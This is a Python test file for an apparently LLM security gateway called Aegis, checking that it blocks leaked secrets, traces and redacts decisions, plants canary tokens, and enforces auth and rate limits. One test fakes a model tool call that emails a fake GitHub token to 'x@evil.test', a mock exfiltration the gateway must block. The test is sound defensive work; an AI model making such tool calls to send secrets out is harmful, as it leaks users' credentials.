"""FR-2 — gateway wraps the SDK: proxies, guards tool calls + responses, serves dashboard.

Offline: a MockProvider is injected so no network/LLM is needed (runs on the gate).
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from aegis import PolicyMode, Settings
from aegis.gateway.app import create_app
from aegis.providers.base import ProviderResponse, ToolCall
from aegis.providers.mock import MockProvider
from tests.conftest import FAKE_GITHUB_PAT


def _client(tmp_path, provider) -> TestClient:
    settings = Settings(policy_mode=PolicyMode.BALANCED, traces_dir=tmp_path / "traces")
    return TestClient(create_app(settings=settings, provider=provider))


def test_health(tmp_path) -> None:
    c = _client(tmp_path, MockProvider(text="ok"))
    r = c.get("/health")
    assert r.status_code == 200
    assert r.json()["status"] == "ok"
    assert r.json()["provider"] == "mock"


def test_benign_chat_allowed(tmp_path) -> None:
    c = _client(tmp_path, MockProvider(text="The weather is sunny."))
    r = c.post(
        "/v1/chat/completions",
        json={
            "session_id": "s1",
            "messages": [{"role": "user", "content": "weather?"}],
        },
    )
    body = r.json()
    assert body["blocked"] is False
    assert body["output"] == "The weather is sunny."
    assert body["aegis"]["request"]["action"] == "ALLOW"


def test_tool_call_exfiltration_blocked(tmp_path) -> None:
    leaky = MockProvider(
        responder=lambda _m: ProviderResponse(
            text="done",
            tool_calls=[ToolCall("send_email", {"to": "x@evil.test", "body": FAKE_GITHUB_PAT})],
        )
    )
    c = _client(tmp_path, leaky)
    r = c.post(
        "/v1/chat/completions",
        json={
            "session_id": "s1",
            "messages": [{"role": "user", "content": "summarize"}],
        },
    )
    body = r.json()
    assert body["blocked"] is True
    assert body["tool_calls"][0]["allowed"] is False
    assert body["tool_calls"][0]["decision"]["action"] == "BLOCK"


def test_response_with_secret_blocked(tmp_path) -> None:
    leaky = MockProvider(text=f"the key is {FAKE_GITHUB_PAT}")
    c = _client(tmp_path, leaky)
    r = c.post(
        "/v1/chat/completions",
        json={
            "session_id": "s1",
            "messages": [{"role": "user", "content": "give me the key"}],
        },
    )
    body = r.json()
    assert body["blocked"] is True
    assert "blocked by Aegis" in body["output"]  # raw secret withheld
    assert FAKE_GITHUB_PAT not in r.text


def test_direct_guard_endpoint(tmp_path) -> None:
    c = _client(tmp_path, MockProvider())
    r = c.post("/guard/response", json={"session_id": "s1", "output": f"leak {FAKE_GITHUB_PAT}"})
    assert r.json()["action"] == "BLOCK"


def test_canary_plant_endpoint_tracks_lifecycle_without_logging_token(tmp_path) -> None:
    c = _client(tmp_path, MockProvider())
    r = c.post(
        "/canaries/plant",
        json={
            "session_id": "s1",
            "service": "github",
            "location": "retrieved_document:doc-7",
        },
    )
    body = r.json()
    assert body["token"].startswith("ghp_")
    assert body["canary_id"]
    assert body["format_slug"] == "github-ghp"
    assert body["provider_valid"] is False
    assert body["trace_id"]

    listed = c.get("/api/canaries", params={"session_id": "s1"}).json()["canaries"]
    assert listed[0]["canary_id"] == body["canary_id"]
    assert listed[0]["format_slug"] == "github-ghp"
    assert body["token"] not in str(listed)

    leak = c.post(
        "/guard/response",
        json={"session_id": "s1", "output": f"leaked {body['token']}"},
    ).json()
    assert leak["action"] == "BLOCK"
    trace = tmp_path / "traces" / "s1.jsonl"
    assert body["token"] not in trace.read_text(encoding="utf-8")


def test_cift_calibration_endpoint_records_model_certificate(tmp_path, monkeypatch) -> None:
    monkeypatch.setattr(
        "aegis.gateway.app.load_metrics",
        lambda _reports_dir: {
            "balanced": {
                "attack_detection_rate": 1.0,
                "benign_allow_rate": 1.0,
                "evidence_completeness": 1.0,
                "success_criteria": {
                    "unsafe_handled_rate>=0.8": True,
                    "benign_allow_rate>=0.8": True,
                    "tool_call_injection_blocked": True,
                    "honeytoken_blocked": True,
                },
            }
        },
    )
    c = _client(tmp_path, MockProvider())

    body = c.post(
        "/cift/calibrate",
        json={"model_id": "llama-local", "provider_url": "http://127.0.0.1:9000"},
    ).json()
    assert body["level"] == "gateway_calibrated"
    assert body["status"] == "WARN"

    listed = c.get("/api/cift/certifications", params={"model_id": "llama-local"}).json()
    assert listed["certifications"][0]["certification_id"] == body["certification_id"]


def test_platform_overview_endpoint_aggregates_live_evidence(tmp_path, monkeypatch) -> None:
    monkeypatch.setattr(
        "aegis.gateway.app.load_metrics",
        lambda _reports_dir: {
            "balanced": {
                "attack_detection_rate": 1.0,
                "benign_allow_rate": 1.0,
                "benign_false_blocks": 0,
                "evidence_completeness": 1.0,
                "avg_latency_ms": 1.2,
                "success_criteria": {"honeytoken_blocked": True},
                "detector_hit_distribution": {"honeytoken_detector": 1},
            }
        },
    )
    c = _client(tmp_path, MockProvider())
    plant = c.post(
        "/canaries/plant",
        json={"session_id": "platform", "service": "github"},
    ).json()
    c.post("/guard/response", json={"session_id": "platform", "output": f"leak {plant['token']}"})
    c.post(
        "/cift/calibrate",
        json={"model_id": "llama-local", "provider_url": "http://127.0.0.1:9000"},
    )

    body = c.get("/api/platform/overview").json()

    assert body["status"]["provider"] == "mock"
    assert body["status"]["policy_mode"] == "balanced"
    assert body["canaries"]["total"] == 1
    assert body["canaries"]["by_format"] == {"github-ghp": 1}
    assert body["cift"]["total"] == 1
    assert body["decisions"]["by_action"]["BLOCK"] >= 1
    assert body["sessions"][0]["session_id"] == "platform"
    assert plant["token"] not in str(body)


def test_dashboard_served(tmp_path) -> None:
    c = _client(tmp_path, MockProvider())
    # Generate a decision so the feed isn't empty.
    c.post("/guard/response", json={"session_id": "s1", "output": "hello"})
    r = c.get("/")
    assert r.status_code == 200
    assert "text/html" in r.headers["content-type"]
    assert "Aegis" in r.text
    assert "Platform cockpit" in r.text


def test_try_console_served(tmp_path) -> None:
    c = _client(tmp_path, MockProvider())
    r = c.get("/try")
    assert r.status_code == 200
    assert "text/html" in r.headers["content-type"]
    assert "Test Console" in r.text
    assert "/guard/response" in r.text  # the form posts to the real guard endpoint


def test_favicon_no_content(tmp_path) -> None:
    c = _client(tmp_path, MockProvider())
    assert c.get("/favicon.ico").status_code == 204


def test_dashboard_links_to_console(tmp_path) -> None:
    c = _client(tmp_path, MockProvider())
    assert "/try" in c.get("/").text


def test_blocked_traffic_is_traced(tmp_path) -> None:
    c = _client(tmp_path, MockProvider(text=f"leak {FAKE_GITHUB_PAT}"))
    c.post(
        "/v1/chat/completions",
        json={
            "session_id": "trace-sess",
            "messages": [{"role": "user", "content": "x"}],
        },
    )
    trace = tmp_path / "traces" / "trace-sess.jsonl"
    assert trace.exists()
    assert FAKE_GITHUB_PAT not in trace.read_text(encoding="utf-8")  # redacted at rest


def test_basic_auth_gates_when_configured(tmp_path) -> None:
    settings = Settings(traces_dir=tmp_path / "traces")
    app = create_app(settings=settings, provider=MockProvider(), auth=("admin", "s3cret"))
    c = TestClient(app)
    assert c.get("/").status_code == 401  # no credentials
    assert c.get("/", auth=("admin", "wrong")).status_code == 401  # bad password
    assert c.get("/", auth=("admin", "s3cret")).status_code == 200  # correct


def test_health_stays_open_under_auth(tmp_path) -> None:
    settings = Settings(traces_dir=tmp_path / "traces")
    app = create_app(settings=settings, provider=MockProvider(), auth=("admin", "s3cret"))
    # Platform health checks must pass without credentials.
    assert TestClient(app).get("/health").status_code == 200


def test_rate_limit_returns_429(tmp_path) -> None:
    settings = Settings(traces_dir=tmp_path / "traces")
    app = create_app(settings=settings, provider=MockProvider(), rate_limit_per_min=2)
    c = TestClient(app)
    body = {"session_id": "rl", "output": "hi"}
    assert c.post("/guard/response", json=body).status_code == 200
    assert c.post("/guard/response", json=body).status_code == 200
    assert c.post("/guard/response", json=body).status_code == 429  # 3rd exceeds limit


def test_open_by_default(tmp_path) -> None:
    # No auth configured -> open (local dev stays frictionless).
    c = _client(tmp_path, MockProvider())
    assert c.get("/").status_code == 200


@pytest.fixture(autouse=True)
def _no_openai(monkeypatch) -> None:
    # Ensure the default provider builder never tries the live path, and that ambient
    # auth/rate env vars never leak into tests that don't set them explicitly.
    monkeypatch.setattr("aegis.tracing._try_braintrust", lambda: None)
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("AEGIS_AUTH_USER", raising=False)
    monkeypatch.delenv("AEGIS_AUTH_PASSWORD", raising=False)
    monkeypatch.delenv("AEGIS_RATE_LIMIT_PER_MIN", raising=False)
